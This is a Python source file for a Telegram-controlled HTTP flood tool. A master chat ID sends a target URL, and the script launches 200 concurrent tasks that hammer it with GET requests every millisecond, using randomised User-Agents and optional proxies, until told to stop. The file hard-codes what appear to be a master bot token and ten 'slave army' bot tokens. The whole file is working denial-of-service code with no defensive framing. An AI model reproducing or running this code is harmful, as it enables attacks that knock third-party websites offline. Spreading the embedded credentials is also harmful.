import asyncio
import aiohttp
import random
from aiohttp import web

MASTER_TOKEN = "8536346083:AAGYUDR6cd7hI9_41_gNbQdREbBb6Dn_9v4"
SLAVE_ARMY = {
    "S1": "8064983761:AAGEZRc9LASS7Fkifm3C3ebOdykCTTJUZ_0",
    "S2": "8460123410:AAE61k-8wPWE4hkmOxge802d8k7CTrhcfCE",
    "S3": "8529444938:AAHd0VxfMeMlA3XSu9NH5RiBcUvRW09atgE",
    "S4": "8500850898:AAEje_m--Tt7eOYjKWwpxXC_BYl2NhiqgVc",
    "S5": "8497321044:AAGGQ2eng3ZgtjOECMRyHO_OJjvSuLTH9RI",
    "S6": "8201736485:AAGFSv-af1506M9pipoaFbHKQW2vLloIMFk",
    "S7": "8420555273:AAHD4mJVw1wY0_nQVSenIBNEaAomcH98sXo",
    "S8": "8524480261:AAGCe54hX-9PjDsVQW5whE36kj5IBNmKRKA",
    "S9": "8579851332:AAGSd7Mtze2XfBlFoQWcIL5JrzBiz47qXAI",
    "S10": "8525114674:AAE7LnGxkqaaL6M0DH25NiU3WYHygWYlON4"
}
MASTER_ID = 1938591484

class SovereignCore:
    def __init__(self):
        self.m_token = MASTER_TOKEN
        self.army = SLAVE_ARMY
        self.targets = {}
        self.active_tasks = []
        self.session = None

    async def _notify(self, text, token=None, chat_id=MASTER_ID):
        url = f"https://api.telegram.org/bot{token or self.m_token}/sendMessage"
        try:
            async with self.session.post(url, json={'chat_id': chat_id, 'text': text, 'parse_mode': 'Markdown'}) as r:
                return await r.json()
        except: pass

    async def _strike_task(self, target, proxies):
        while target in self.targets:
            proxy = random.choice(proxies) if proxies else None
            h = {'User-Agent': f'Mozilla/5.0 Chrome/{random.randint(110,127)}.0.0.0'}
            try:
                async with self.session.get(target, headers=h, proxy=f"http://{proxy}" if proxy else None, timeout=5) as r:
                    self.targets[target] += 1
            except: pass
            await asyncio.sleep(0.001)

    async def handle_updates(self):
        offset = 0
        while True:
            try:
                url = f"https://api.telegram.org/bot{self.m_token}/getUpdates?offset={offset}&timeout=30"
                async with self.session.get(url, timeout=35) as r:
                    if r.status != 200:
                        await asyncio.sleep(5)
                        continue
                    data = await r.json()
                    if not data.get('ok'): continue
                    for update in data.get('result', []):
                        offset = update['update_id'] + 1
                        msg = update.get('message', {})
                        text = msg.get('text', '')
                        uid = msg.get('from', {}).get('id', 0)
                        if uid != MASTER_ID: continue
                        
                        if text == "/start" or text == "/army":
                            rep = "📊 **ARMY STATUS:**\n"
                            for s, tk in self.army.items():
                                try:
                                    async with self.session.get(f"https://api.telegram.org/bot{tk}/getMe") as rb:
                                        d = await rb.json()
                                        rep += f"✅ {s}: @{d['result']['username']}\n" if d.get('ok') else f"❌ {s}: ERROR\n"
                                except: rep += f"❌ {s}: DEAD\n"
                            await self._notify(rep)
                        elif text.startswith("http"):
                            self.targets[text] = 0
                            await self._notify(f"⚔️ **ATTACK START:** {text}")
                            for _ in range(200):
                                self.active_tasks.append(asyncio.create_task(self._strike_task(text, [])))
                        elif text == "/stop":
                            self.targets.clear()
                            for t in self.active_tasks: t.cancel()
                            self.active_tasks.clear()
                            await self._notify("🛑 **STOPPED**")
            except: await asyncio.sleep(2)

async def main():
    core = SovereignCore()
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0)) as sess:
        core.session = sess
        app = web.Application()
        app.router.add_get('/', lambda r: web.Response(text="RUNNING"))
        runner = web.AppRunner(app)
        await runner.setup()
        await web.TCPSite(runner, '0.0.0.0', 10000).start()
        await core.handle_updates()

if __name__ == "__main__":
    asyncio.run(main())
    
